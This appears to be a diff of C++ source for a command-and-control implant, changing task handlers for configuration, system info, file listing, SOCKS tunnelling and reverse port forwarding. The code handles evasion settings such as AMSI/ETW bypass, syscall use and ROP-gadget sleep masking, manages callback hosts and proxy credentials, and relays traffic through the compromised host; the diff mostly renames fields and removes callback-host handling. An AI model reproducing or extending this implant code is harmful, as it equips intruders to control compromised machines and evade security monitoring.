@@ -58,7 +58,7 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
 
     if ( ! DataPsr || ! PsrLen ) {
         Self->Pkg->Int32( Self->Jbs->PostJobs, Self->Jbs->Count );
-        KhDbg("ERROR: No data received or zero length");
+        KhDbg("Not received task");
         return FinalRoutine();
     }
 
@@ -587,12 +587,12 @@ auto DECLFN Task::Info(
     Self->Pkg->Int32( Package, Self->Config.Jitter );
 
     // evasion
-    Self->Pkg->Int32( Package, Self->Config.Mask.TechniqueID );
+    Self->Pkg->Int32( Package, Self->Config.Mask.Beacon );
     Self->Pkg->Int32( Package, Self->Config.Mask.Heap );
     Self->Pkg->Int64( Package, Self->Config.Mask.JmpGadget );
     Self->Pkg->Int64( Package, Self->Config.Mask.NtContinueGadget );
 
-    Self->Pkg->Int32( Package, Self->Config.BofHook );
+    Self->Pkg->Int32( Package, Self->Config.BofProxy );
     Self->Pkg->Int32( Package, Self->Config.Syscall );
     Self->Pkg->Int32( Package, Self->Config.AmsiEtwBypass );
 
@@ -646,27 +646,27 @@ auto DECLFN Task::Info(
     // transport
     Self->Pkg->Int32( Package, Self->Config.Profile );
 
-    Self->Pkg->Int32( Package, Self->Config.Web.HostQtt );
-    Self->Pkg->Int32( Package, Self->Config.Web.PortQtt );
-    Self->Pkg->Int32( Package, Self->Config.Web.EndpointQtt );
+    // Self->Pkg->Int32( Package, Self->Config.Web.HostQtt );
+    // Self->Pkg->Int32( Package, Self->Config.Web.PortQtt );
+    // Self->Pkg->Int32( Package, Self->Config.Web.EndpointQtt );
 
-    Self->Pkg->Wstr( Package, Self->Config.Web.Method );
-    Self->Pkg->Wstr( Package, Self->Config.Web.UserAgent );
-    Self->Pkg->Wstr( Package, Self->Config.Web.HttpHeaders );
-    Self->Pkg->Int32( Package, Self->Config.Web.Secure );
-    Self->Pkg->Int32( Package, Self->Config.Web.ProxyEnabled );
-    Self->Pkg->Wstr( Package, Self->Config.Web.ProxyUrl );
-    Self->Pkg->Wstr( Package, Self->Config.Web.ProxyUsername );
-    Self->Pkg->Wstr( Package, Self->Config.Web.ProxyPassword);
+    // Self->Pkg->Wstr( Package, Self->Config.Web.Method );
+    // Self->Pkg->Wstr( Package, Self->Config.Web.UserAgent );
+    // Self->Pkg->Wstr( Package, Self->Config.Web.HttpHeaders );
+    // Self->Pkg->Int32( Package, Self->Config.Web.Secure );
+    // Self->Pkg->Int32( Package, Self->Config.Web.ProxyEnabled );
+    // Self->Pkg->Wstr( Package, Self->Config.Web.ProxyUrl );
+    // Self->Pkg->Wstr( Package, Self->Config.Web.ProxyUsername );
+    // Self->Pkg->Wstr( Package, Self->Config.Web.ProxyPassword);
 
-    for ( int i = 0; i < Self->Config.Web.HostQtt; i++ ) {
-        Self->Pkg->Wstr( Package, Self->Config.Web.Host[i] );
-        Self->Pkg->Int32( Package, Self->Config.Web.Port[i] );
-    }
+    // for ( int i = 0; i < Self->Config.Web.HostQtt; i++ ) {
+    //     Self->Pkg->Wstr( Package, Self->Config.Web.Host[i] );
+    //     Self->Pkg->Int32( Package, Self->Config.Web.Port[i] );
+    // }
 
-    for ( int i = 0; i < Self->Config.Web.EndpointQtt; i++ ) {
-        Self->Pkg->Wstr( Package, Self->Config.Web.EndPoint[i] );
-    }
+    // for ( int i = 0; i < Self->Config.Web.EndpointQtt; i++ ) {
+    //     Self->Pkg->Wstr( Package, Self->Config.Web.EndPoint[i] );
+    // }
 
     KhDbg("Info task completed successfully");
 
@@ -1057,7 +1057,6 @@ auto DECLFN Task::FileSystem(
                 Self->Pkg->Int16( Package, WriteTime.wHour   );
                 Self->Pkg->Int16( Package, WriteTime.wMinute );
                 Self->Pkg->Int16( Package, WriteTime.wSecond );
-        
             } while ( Self->Krnl32.FindNextFileA( FindHandle, &FindData ));
         
             Success = Self->Krnl32.FindClose( FindHandle );
@@ -1229,12 +1228,12 @@ auto DECLFN Task::Config(
                     return KH_ERROR_INVALID_MASK_ID;
                 }
             
-                Self->Config.Mask.TechniqueID = TechniqueID;
+                Self->Config.Mask.Beacon = TechniqueID;
             
                 KhDbg( 
-                    "mask technique id set to %d (%s)", Self->Config.Mask.TechniqueID, 
-                    Self->Config.Mask.TechniqueID   == eMask::Timer ? "timer" : 
-                    ( Self->Config.Mask.TechniqueID == eMask::None  ? "wait" : "unknown" ) 
+                    "mask technique id set to %d (%s)", Self->Config.Mask.Beacon, 
+                    Self->Config.Mask.Beacon   == eMask::Timer ? "timer" : 
+                    ( Self->Config.Mask.Beacon == eMask::None  ? "wait" : "unknown" ) 
                 );
 
                 break;
@@ -1357,158 +1356,6 @@ auto DECLFN Task::Config(
 
                 break;
             }
-            case Enm::Config::CallbackHost: {
-                INT32 ActionId     = Self->Psr->Int32( Parser );
-                CHAR* CallbackHost = Self->Psr->Str( Parser, nullptr );
-                ULONG CallbackPort = Self->Psr->Int32( Parser );
-
-                WCHAR wCallbackHost[MAX_PATH*2] = { 0 };
-                Str::CharToWChar( wCallbackHost, CallbackHost, MAX_PATH * 2 );
-
-                if ( ActionId == CFG_HOST_ACTID_RM ) {
-                    WCHAR** NewHostList = NULL;
-                    ULONG*  NewPortList = NULL;
-
-                    WCHAR** OldHostList  = Self->Config.Web.Host;
-                    ULONG*  OldPortList  = Self->Config.Web.Port;
-                    ULONG   HostListSize = Self->Config.Web.HostQtt;
-                    ULONG   PortListSize = Self->Config.Web.PortQtt;
-
-                    BOOL  Found      = FALSE;
-                    ULONG FoundIndex = 0;
-                    
-                    for ( int i = 0; i < HostListSize; i++ ) {
-                        if (
-                            Str::CompareW( wCallbackHost, OldHostList[i]) == 0 && 
-                            CallbackPort == OldPortList[i] 
-                        ) {
-                            Found      = TRUE;
-                            FoundIndex = i;
-                            break;
-                        }
-                    }
-
-                    if ( ! Found ) {
-                        break; 
-                    }
-
-                    ULONG NewSize = HostListSize - 1;
-                    if ( NewSize > 0 ) {
-                        NewHostList = (WCHAR**)hAlloc( NewSize * sizeof(WCHAR*) );
-                        NewPortList = (ULONG* )hAlloc( NewSize * sizeof(ULONG ) ) ;
-
-                        for (ULONG i = 0; i < FoundIndex; i++) {
-                            ULONG HostLen = Str::LengthW( OldHostList[i] ) + 1;
-                            NewHostList[i] = (WCHAR*)hAlloc( HostLen * sizeof(WCHAR)) ;
-
-                            Str::CopyW( NewHostList[i], OldHostList[i] );
-                            NewPortList[i] = OldPortList[i];
-                        }
-
-                        for ( int i = FoundIndex + 1; i < HostListSize; i++ ) {
-                            ULONG  NewIndex = i - 1;
-                            ULONG HostLen = Str::LengthW(OldHostList[i]) + 1;
-                            NewHostList[NewIndex] = (WCHAR*)hAlloc( HostLen * sizeof(WCHAR) ) ;
-
-                            Str::CopyW(NewHostList[NewIndex], OldHostList[i]);
-                            NewPortList[NewIndex] = OldPortList[i];
-                        }
-                    }
-
-                    if ( OldHostList && OldPortList ) {
-                        for ( int i = 0; i < HostListSize; i++ ) {
-                            if ( OldHostList[i] ) {
-                                hFree( OldHostList[i] );
-                            }
-                        }
-                        hFree( OldHostList );
-                        hFree( OldPortList );
-                    }
-
-                    Self->Config.Web.Host    = NewHostList;
-                    Self->Config.Web.Port    = NewPortList;
-                    Self->Config.Web.HostQtt = NewSize;
-                    Self->Config.Web.PortQtt = NewSize;
-
-                } else if ( ActionId == CFG_HOST_ACTID_ADD ) {
-                    WCHAR** NewHostList = NULL;
-                    ULONG*  NewPortList = NULL;
-
-                    WCHAR** OldHostList  = Self->Config.Web.Host;
-                    ULONG*  OldPortList  = Self->Config.Web.Port;
-                    ULONG   HostListSize = Self->Config.Web.HostQtt;
-
-                    BOOL AlreadyExists = FALSE;
-                    if ( OldHostList && OldPortList ) {
-                        for (ULONG i = 0; i < HostListSize; i++) {
-                            if ( 
-                                Str::CompareW( wCallbackHost, OldHostList[i] ) == 0 && 
-                                CallbackPort == OldPortList[i] 
-                            ) {
-                                AlreadyExists = TRUE;
-                                break;
-                            }
-                        }
-                    }
-
-                    if ( AlreadyExists ) {
-                        break; 
-                    }
-
-                    ULONG NewSize = HostListSize + 1;
-                    NewHostList = (WCHAR**)hAlloc( NewSize * sizeof(WCHAR*) );
-                    NewPortList = (ULONG* )hAlloc( NewSize * sizeof(ULONG ) ) ;
-
-                    if ( OldHostList && OldPortList ) {
-                        for (ULONG i = 0; i < HostListSize; i++) {
-                            ULONG HostLen = Str::LengthW( OldHostList[i] ) + 1;
-                            NewHostList[i] = (WCHAR*)hAlloc( HostLen * sizeof(WCHAR) ) ;
-
-                            Str::CopyW( NewHostList[i], OldHostList[i] );
-                            NewPortList[i] = OldPortList[i];
-                        }
-                    }
-
-                    ULONG NewHostLen = Str::LengthW( wCallbackHost ) + 1;
-                    NewHostList[NewSize - 1] = (WCHAR*)hAlloc( NewHostLen * sizeof(WCHAR)) ;
-
-                    Str::CopyW(NewHostList[NewSize - 1], wCallbackHost);
-                    NewPortList[NewSize - 1] = CallbackPort;
-
-                    if ( OldHostList && OldPortList ) {
-                        for (ULONG i = 0; i < HostListSize; i++) {
-                            if ( OldHostList[i] ) {
-                                hFree( OldHostList[i] );
-                            }
-                        }
-                        hFree( OldHostList );
-                        hFree( OldPortList );
-                    }
-
-                    Self->Config.Web.Host   = NewHostList;
-                    Self->Config.Web.Port    = NewPortList;
-                    Self->Config.Web.HostQtt = NewSize;
-                    Self->Config.Web.PortQtt = NewSize;
-                }
-
-                break;
-            }
-            case Enm::Config::CallbackUserAgt: {
-                ULONG UserAgtSize = 0;
-                CHAR* UserAgent   = Self->Psr->Str( Parser, &UserAgtSize );
-
-                WCHAR* wUserAgent = (WCHAR*)hAlloc( UserAgtSize * 2 );
-
-                Str::CharToWChar( wUserAgent, UserAgent, UserAgtSize * 2 );
-
-                if ( Self->Hp->CheckPtr( Self->Config.Web.UserAgent ) ) {
-                    hFree( Self->Config.Web.UserAgent );
-                }
-
-                Self->Config.Web.UserAgent = wUserAgent;
-
-                break;
-            }
             case Enm::Config::CallbackProxy: {
                 BOOL  ProxyEbl  = Self->Psr->Int32( Parser );
                 ULONG UrlSize   = 0;
@@ -1518,35 +1365,35 @@ auto DECLFN Task::Config(
                 ULONG PassSize  = 0;
                 CHAR* ProxyPass = Self->Psr->Str( Parser, &PassSize );
                 
-                if ( Self->Hp->CheckPtr( Self->Config.Web.ProxyUrl ) && ( ProxyUrl && UrlSize ) ) {
-                    hFree( Self->Config.Web.ProxyUrl ); 
+                if ( Self->Hp->CheckPtr( Self->Config.Http.Proxy.Url ) && ( ProxyUrl && UrlSize ) ) {
+                    hFree( Self->Config.Http.Proxy.Url ); 
                 }
 
                 if ( ProxyUrl && UrlSize ) {
                     WCHAR* wProxyUrl = (WCHAR*)hAlloc( UrlSize * 2 );
                     Str::CharToWChar( wProxyUrl, ProxyUrl, UrlSize * 2 );
-                    Self->Config.Web.ProxyUrl = wProxyUrl;
+                    Self->Config.Http.Proxy.Url = wProxyUrl;
                 }
                 
 
-                if ( Self->Hp->CheckPtr( Self->Config.Web.ProxyUsername ) && ( ProxyUser && UserSize ) ) {
-                    hFree( Self->Config.Web.ProxyUsername );
+                if ( Self->Hp->CheckPtr( Self->Config.Http.Proxy.Username ) && ( ProxyUser && UserSize ) ) {
+                    hFree( Self->Config.Http.Proxy.Username );
                 }
 
                 if ( ProxyUser && UserSize ) {
                     WCHAR* wProxyUser = (WCHAR*)hAlloc( UserSize * 2 );
                     Str::CharToWChar( wProxyUser, ProxyUser, UserSize * 2 );
-                    Self->Config.Web.ProxyUsername = wProxyUser;
+                    Self->Config.Http.Proxy.Username = wProxyUser;
                 }
 
-                if ( Self->Hp->CheckPtr( Self->Config.Web.ProxyPassword ) && ( ProxyPass && PassSize ) ) {
-                    hFree( Self->Config.Web.ProxyPassword );
+                if ( Self->Hp->CheckPtr( Self->Config.Http.Proxy.Password ) && ( ProxyPass && PassSize ) ) {
+                    hFree( Self->Config.Http.Proxy.Password );
                 }
 
                 if ( ProxyPass && PassSize ) {
                     WCHAR* wProxyPass = (WCHAR*)hAlloc( PassSize * 2 );
                     Str::CharToWChar( wProxyPass, ProxyPass, PassSize * 2 );
-                    Self->Config.Web.ProxyPassword = wProxyPass;
+                    Self->Config.Http.Proxy.Password = wProxyPass;
                 }
 
                 break;
@@ -1838,7 +1685,7 @@ auto DECLFN Task::ProcessTunnel(
     COMMAND_TUNNEL_WRITE_TCP_EVENT WriteEvents[30]  = { 0 };
 
     ULONG WriteEvtLen = 0;
-    ULONG AcceptLen = 0;
+    ULONG AcceptLen   = 0;
     ULONG StartEvtLen = 0;
 
     INT8  Index    = -1;
@@ -2070,13 +1917,6 @@ auto DECLFN Task::ProcessTunnel(
                     } else if ( readed ) {
                         KhDbg("readed %lu bytes from Tunnel %d, Adding to COMMAND_TUNNEL_WRITE_TCP", readed, Self->Tsp->Tunnels[i].ChannelID);
 
-                        //// debug chunk data
-                        // KhDbg( "READED BYTES" );
-                        // for ( UINT64 i = 0; i < readed; i++ ) {
-                        //     KhDbg( "%02X ", BufferBase[i] );
-                        // }
-                        // KhDbg( "Done Printing\n" );
-
                         if ( WriteEvtLen < 90 ) {
                             WriteEvents[WriteEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                             WriteEvents[WriteEvtLen].SubCmd    = COMMAND_TUNNEL_WRITE_TCP;
@@ -2193,7 +2033,7 @@ auto DECLFN Task::Socks(
             CHAR* Address   = Self->Psr->Str( Parser, 0 );
             ULONG Port      = Self->Psr->Int32( Parser );
 
-            KhDbg( "protocol: %s", protocol );
+            KhDbg( "protocol: %s", Protocol );
             KhDbg( "channelID: %lu", ChannelID );
             KhDbg( "address: %s", Address );
             KhDbg( "port: %d", Port );
@@ -2233,7 +2073,7 @@ auto DECLFN Task::Socks(
                     
                     if ( Self->Ws2_32.ioctlsocket( SocketObj, FIONBIO, &Mode ) != -1 ) {
                         if ( ! ( Self->Ws2_32.connect( SocketObj, (sockaddr*)&SocketAddr, sizeof( sockaddr ) ) == -1 && Self->Ws2_32.WSAGetLastError() != WSAEWOULDBLOCK ) ) {
-                            KhDbg("Socket connected successfully: %s:%d", address, port);
+                            KhDbg("Socket connected successfully: %s:%d", Address, Port);
 
                             INT32 Mode = 0;
 
@@ -2305,8 +2145,8 @@ auto DECLFN Task::Socks(
             ULONG ChunkSize = Self->Psr->Int32( Parser );
             BYTE* ChunkData = Self->Psr->Bytes( Parser, 0 );
 
-            KhDbg( "Protocol:   %s ", protocol );
-            KhDbg( "Channel ID: %lu", channelID );
+            KhDbg( "Protocol:   %s ", Protocol );
+            KhDbg( "Channel ID: %lu", ChannelID );
             KhDbg( "Chunk Size: %d ", ChunkSize );
 
             //// debug chunk data
@@ -2360,7 +2200,7 @@ auto DECLFN Task::Socks(
         }
         case KH_SOCKET_CLOSE:{
             ULONG ChannelID = Self->Psr->Int32( Parser );
-            KhDbg( "Delete and close Channel ID: %lu", channelID );
+            KhDbg( "Delete and close Channel ID: %lu", ChannelID );
 
             for (INT i = 0; i < 30; i++) {
                 if ( Self->Tsp->Tunnels[i].ChannelID == ChannelID && Self->Tsp->Tunnels[i].State != TUNNEL_STATE_CLOSE ) {
@@ -2385,7 +2225,7 @@ auto Task::RPortfwd(
     ULONG Port      = Self->Psr->Int32( Parser );
 
     KhDbg( "Channel ID: %lu", ChannelID );
-    KhDbg( "Port: %d", port );
+    KhDbg( "Port: %d", Port );
 
     for ( INT i = 0; i < 30; i++ ) {
         if ( ! Self->Tsp->Tunnels[i].ChannelID || Self->Tsp->Tunnels[i].ChannelID == 0 ) {
@@ -2418,9 +2258,9 @@ auto Task::RPortfwd(
         ULONG Mode = 1;
         if ( Self->Ws2_32.ioctlsocket( SocketObj, FIONBIO, &Mode ) != -1) {
             if ( Self->Ws2_32.bind( SocketObj, (sockaddr*)&SocketAddr, sizeof( SocketAddr ) ) != -1 ) {
-                KhDbg("Socket binded successfully: %d", port);
+                KhDbg("Socket binded successfully: %d", Port);
                 if ( Self->Ws2_32.listen( SocketObj, 10 ) != -1 ){
-                    KhDbg("Socket listened successfully: %d", port);
+                    KhDbg("Socket listened successfully: %d", Port);
                         
                     Self->Tsp->Tunnels[Index].ChannelID = ChannelID;
                     Self->Tsp->Tunnels[Index].Port      = Port;
